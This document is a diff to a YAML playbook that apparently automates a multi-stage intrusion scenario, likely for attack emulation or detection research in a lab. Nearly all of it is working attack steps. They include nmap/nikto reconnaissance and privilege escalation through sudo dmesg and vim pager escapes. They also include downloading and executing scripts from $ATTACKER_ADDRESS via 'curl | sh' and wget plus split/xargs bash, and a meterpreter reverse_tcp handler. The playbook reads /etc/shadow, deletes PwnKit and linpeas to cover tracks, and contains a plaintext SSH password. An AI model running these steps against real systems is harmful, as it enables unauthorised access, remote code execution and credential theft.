@@ -1,6 +1,6 @@
 ####################
 #
-# Scenario 1 e a
+# Scenario 1 b a
 #
 ####################
 msf_config:
@@ -24,7 +24,7 @@ commands:
     cmd: dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN
 
   - type: shell
-    cmd: nmap -O -sT --top-ports 100 $SERVER_ADDRESS
+    cmd: sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS
 
   - type: shell
     cmd: "nikto -host $SERVER_ADDRESS"
@@ -98,96 +98,54 @@ commands:
     session: "foothold"
 
   - type: msf-session
-    cmd: vim /usr/share/awffull/awffull
+    cmd: sudo dmesg -H
+    write: True
     session: "foothold"
 
   - type: msf-session
-    cmd: ":inoremap jj <ESC>"
+    cmd: "!/bin/bash"
     session: "foothold"
-
-  - type: msf-session
-    cmd: "o"
-    session: "foothold"
-
-  - type: msf-session
-    cmd: "curl http://$ATTACKER_ADDRESS/TODO.md | sh"
-    session: "foothold"
-
-  - type: msf-session
-    cmd: "jj"
-    session: "foothold"
-
-  - type: msf-session
-    cmd: ":wq!\n"
-    session: "foothold"
-
-  - type: msf-module
-    cmd: exploit/multi/handler
-    creates_session: "root"
-    payload_options:
-      LHOST: 192.42.1.174
-    payload: cmd/unix/python/meterpreter/reverse_tcp
-
-  - type: msf-session
-    stdapi: True
-    cmd: "getuid"
-    session: "root"
-
-  - type: msf-session
-    cmd: shell
-    session: "root"
-
-  - type: msf-session
-    cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
-    session: "root"
- 
-  - type: msf-session
-    cmd: export SHELL=bash
-    session: "root"
- 
-  - type: msf-session
-    cmd: export TERM=xterm256-color
-    session: "root"
- 
-  - type: msf-session
-    cmd: stty rows 38 columns 116
-    session: "root"
 
   - type: msf-session
     cmd: id
-    session: "root"
+    session: "foothold"
+    end_str: "root@videoserver:/tmp#"
+
 
   - type: msf-session
-    session: "root"
-    cmd: "curl http://$ATTACKER_ADDRESS/README.txt.1 | sh"
-
-  - type: sleep
-    seconds: 40
+    session: "foothold"
+    cmd: "cd /root; wget -O README.txt http://$ATTACKER_ADDRESS/README.txt.4"
+    end_str: "PWN >"
 
   - type: msf-session
-    cmd: id
-    read: True
-    session: "root"
+    cmd: split --filter="cat $FILE | xargs bash -c " -C 2000 /root/README.txt
+    session: "foothold"
+    end_str: "PWN >"
 
-
-# TODO: THIS COMMAND DOES NOT WORK
-#       DON'T KNOW WHY
-#  - type: msf-session
-#    cmd: split --filter="/usr/bin/cat $FILE | /usr/bin/xargs /bin/bash -c " -C 2000 /root/README.txt
-#    session: "root"
-#
-
-#  - type: msf-session
-#    cmd: rm /root/README.txt
-#    session: "root"
+  - type: msf-session
+    cmd: rm /root/README.txt
+    session: "foothold"
+    end_str: "PWN >"
 
   - type: msf-session
     cmd: exit
-    session: "root"
+    session: "foothold"
+    end_str: "PWN >"
+
+
+  - type: msf-session
+    cmd: rm ./PwnKit
+    session: "foothold"
+    end_str: "PWN >"
+
+  - type: msf-session
+    cmd: rm linpeas.sh
+    session: "foothold"
+    end_str: "PWN >"
 
   - type: msf-session
     cmd: exit
-    session: "root"
+    session: "foothold"
 
   - type: sleep
     seconds: 30
@@ -196,8 +154,8 @@ commands:
     cmd: id
     hostname: 192.42.0.254
     port: 2222
-    username: root
-    key_filename: "/home/aecid/.ssh/attacker_key"
+    username: debian
+    password: haveityourway
     creates_session: "rootshell"
 
   - type: ssh
@@ -205,15 +163,15 @@ commands:
     session: "rootshell"
 
   - type: ssh
-    cmd: cat /etc/shadow
+    cmd: sudo cat /etc/shadow
     session: "rootshell"
 
   - type: ssh
-    cmd: lspci
+    cmd: sudo lspci
     session: "rootshell"
 
   - type: ssh
-    cmd: command -v lsusb
+    cmd: sudo bash -c "command -v lsusb"
     session: "rootshell"
 
   - type: ssh
@@ -221,5 +179,25 @@ commands:
     session: "rootshell"
 
   - type: ssh
-    cmd: find /usr -name \*virtualbox\*
+    cmd: sudo find /usr -name \*virtualbox\*
     session: "rootshell"
+
+
+      #
+      #  - type: msf-session
+      #    cmd: sudo -l
+      #
+      #  - type: msf-session
+      #    write: True
+      #    cmd: "sudo dmesg -H"
+      #
+      #  - type: msf-session
+      #    write: True
+      #    cmd: "!/bin/bash\r\n"
+      #
+      #  - type: msf-session
+      #    cmd: id
+      #
+      #  - type: msf-session
+      #    cmd: ls -l /root
+      #
